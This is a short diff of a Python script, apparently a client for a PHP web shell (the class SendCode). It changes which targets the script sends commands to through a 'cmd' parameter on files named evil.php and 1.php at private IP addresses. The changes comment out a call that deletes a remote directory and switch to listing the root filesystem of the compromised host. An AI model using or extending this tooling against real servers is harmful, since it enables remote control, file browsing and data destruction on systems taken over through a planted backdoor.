@@ -89,7 +89,10 @@ class SendCode(object):
 
 if __name__ == '__main__':
     # s = SendCode("http://172.28.100.13/PhpstormProjects/Cnife/eval_fun.php", 'cmd')
-    s = SendCode("http://172.28.100.84/evil.php", 'cmd')
-    path = s.deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/121/")
+    # s = SendCode("http://172.28.100.84/evil.php", 'cmd')
+    # path = s.deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/121/")
+    # print(path)s = SendCode("http://172.28.100.84/evil.php", 'cmd')
+    s = SendCode("http://172.28.100.19/1.php", 'cmd')
+    path = s.getFilelist('/')
     print(path)
 
